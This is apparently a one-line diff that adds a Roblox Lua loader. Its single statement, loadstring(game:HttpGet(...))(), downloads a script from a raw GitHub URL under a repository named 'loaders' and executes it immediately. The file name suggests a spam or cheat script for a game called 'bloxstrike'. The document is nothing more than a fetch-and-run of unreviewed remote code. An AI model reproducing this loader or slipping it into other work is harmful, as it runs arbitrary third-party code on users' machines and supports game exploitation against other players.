@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/new-map-bloxstrike-spam3-72d2z7ezeef9wo.lua"))()
